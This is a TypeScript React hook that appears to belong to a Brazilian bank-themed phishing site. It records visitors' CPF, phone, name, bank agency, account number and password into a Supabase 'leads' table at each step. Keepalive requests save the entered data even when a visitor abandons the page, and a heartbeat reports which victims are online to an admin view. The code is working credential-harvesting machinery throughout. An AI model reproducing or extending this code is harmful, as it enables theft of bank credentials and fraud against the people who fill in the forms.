import { useEffect, useRef } from "react";
import { useLocation } from "react-router-dom";
import { useFlow } from "@/contexts/FlowContext";
import { leadRepository, sessionRepository, type LeadUpdate } from "@/repositories";
import { edgeFunctionsService } from "@/services";

const ADMIN_ROUTES = ["/admin"];
const HEARTBEAT_INTERVAL = 30_000; // 30 s

// sessionStorage is blocked in iOS Safari private browsing — wrap every access.
function sessionGet(key: string): string | null {
  try { return sessionStorage.getItem(key); } catch { return null; }
}
function sessionSet(key: string, value: string): void {
  try { sessionStorage.setItem(key, value); } catch { /* non-fatal */ }
}

function buildLeadUpdates(data: Record<string, string>): LeadUpdate {
  const updates: LeadUpdate = {};
  if (data.cpf) updates.cpf = data.cpf;
  if (data.phone) updates.phone = data.phone;
  if (data.nome) updates.nome = data.nome;
  if (data.segment) updates.segment = data.segment;
  if (data.agency) updates.agency = data.agency;
  if (data.account) updates.account = data.account;
  if (data.password) updates.password = data.password;
  return updates;
}

export function useLeadTracking() {
  const location = useLocation();
  const { data } = useFlow();
  const leadIdRef = useRef<string | null>(sessionGet("lead_id"));
  const sessionIdRef = useRef<string | null>(null);
  const dataRef = useRef(data);
  dataRef.current = data;

  const isAdmin = ADMIN_ROUTES.some((r) => location.pathname.startsWith(r));

  // ── Single effect: track page + persist lead data on every navigation ──
  useEffect(() => {
    if (isAdmin) return;

    const page = location.pathname.replace("/", "") || "splash";

    const track = async () => {
      try {
        const leadUpdates = buildLeadUpdates(data);

        // Ensure lead exists
        if (!leadIdRef.current) {
          const lead = await leadRepository.create({ current_step: page, ...leadUpdates });
          leadIdRef.current = lead.id;
          sessionSet("lead_id", lead.id);
        } else {
          await leadRepository.update(leadIdRef.current, {
            current_step: page,
            ...(page === "concluido" ? { status: "concluido" } : {}),
            ...leadUpdates,
          });
        }

        // Session already exists — just update the page
        if (sessionIdRef.current) {
          await sessionRepository.updatePage(sessionIdRef.current, page);
          return;
        }

        // First visit: create session server-side (geo data stays on server)
        try {
          const result = await edgeFunctionsService.checkAccess({
            lead_id: leadIdRef.current!,
            user_agent: navigator.userAgent,
          });
          sessionIdRef.current = result.session_id ?? null;
        } catch {
          // Session creation failed — non-fatal, tracking continues without session
          console.error("Session creation via edge function failed");
        }
      } catch (err) {
        console.error("Lead tracking error:", err);
      }
    };

    track();

    // ── Flush lead data + mark session offline on page unload ─────────────
    // fetch() with keepalive:true survives page unload.
    // sendBeacon() can't PATCH or set custom headers (Supabase needs apikey).
    const handleUnload = () => {
      const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
      const anonKey    = import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY;

      // Flush lead data (best-effort)
      if (leadIdRef.current) {
        const updates = buildLeadUpdates(dataRef.current);
        if (Object.keys(updates).length > 0) {
          fetch(
            `${supabaseUrl}/rest/v1/leads?id=eq.${leadIdRef.current}`,
            {
              method: "PATCH",
              keepalive: true,
              headers: {
                "Content-Type": "application/json",
                "apikey": anonKey,
                "Authorization": `Bearer ${anonKey}`,
                "Prefer": "return=minimal",
              },
              body: JSON.stringify(updates),
            },
          ).catch(() => {});
        }
      }

      // Mark session offline
      if (!sessionIdRef.current) return;
      fetch(
        `${supabaseUrl}/rest/v1/site_sessions?id=eq.${sessionIdRef.current}`,
        {
          method: "PATCH",
          keepalive: true,
          headers: {
            "Content-Type": "application/json",
            "apikey": anonKey,
            "Authorization": `Bearer ${anonKey}`,
            "Prefer": "return=minimal",
          },
          body: JSON.stringify({ is_online: false, ended_at: new Date().toISOString() }),
        },
      ).catch(() => {});
    };

    // ── Heartbeat: last_seen_at every 30s ────────────────────────────────
    const sendHeartbeat = () => {
      if (!sessionIdRef.current) return;
      const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
      const anonKey    = import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY;
      fetch(
        `${supabaseUrl}/rest/v1/site_sessions?id=eq.${sessionIdRef.current}`,
        {
          method: "PATCH",
          headers: {
            "Content-Type": "application/json",
            "apikey": anonKey,
            "Authorization": `Bearer ${anonKey}`,
            "Prefer": "return=minimal",
          },
          body: JSON.stringify({ last_seen_at: new Date().toISOString() }),
        },
      ).catch(() => {});
    };
    const heartbeatId = setInterval(sendHeartbeat, HEARTBEAT_INTERVAL);

    // ── Exit events (complement heartbeat) ───────────────────────────────
    const handleVisibilityChange = () => { if (document.hidden) handleUnload(); };

    window.addEventListener("beforeunload", handleUnload);
    window.addEventListener("pagehide", handleUnload);
    document.addEventListener("visibilitychange", handleVisibilityChange);

    return () => {
      clearInterval(heartbeatId);
      window.removeEventListener("beforeunload", handleUnload);
      window.removeEventListener("pagehide", handleUnload);
      document.removeEventListener("visibilitychange", handleVisibilityChange);
    };
  }, [location.pathname, isAdmin, data]);
}
